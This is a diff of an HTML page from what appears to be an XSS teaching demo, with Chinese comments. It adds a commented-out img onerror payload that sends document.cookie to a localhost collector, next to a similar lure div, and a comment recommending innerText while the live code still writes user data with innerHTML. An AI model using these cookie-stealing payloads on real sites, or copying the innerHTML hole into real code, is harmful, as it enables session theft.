@@ -9,7 +9,9 @@
       <input name="email" placeholder="email" />
       <input type="submit" value="更新">
     </form>
+    <!-- 用于带在url上或存储到后端的攻击内容 -->
     <!-- <div onclick="fetch(`http://127.0.0.1:8083/xss?cookie=${document.cookie}`)">点我领取红包</div> -->
+    <!-- <img src="http://127.0.0.1:8081/xxx.jpg" onerror="fetch(`http://127.0.0.1:8083/xss?cookie=${document.cookie}`)"> -->
     <script>
       function getData() {
         var xhr = new XMLHttpRequest();
@@ -20,6 +22,8 @@
             console.log(res.responseText);
             const { username, email } = JSON.parse(res.responseText).data;
             document.querySelector('#username').innerHTML = username;
+            // 使用innerText防范xss攻击
+            // document.querySelector('#username').innerText = username;
             document.querySelector('#email').innerHTML = email;
           }
         }
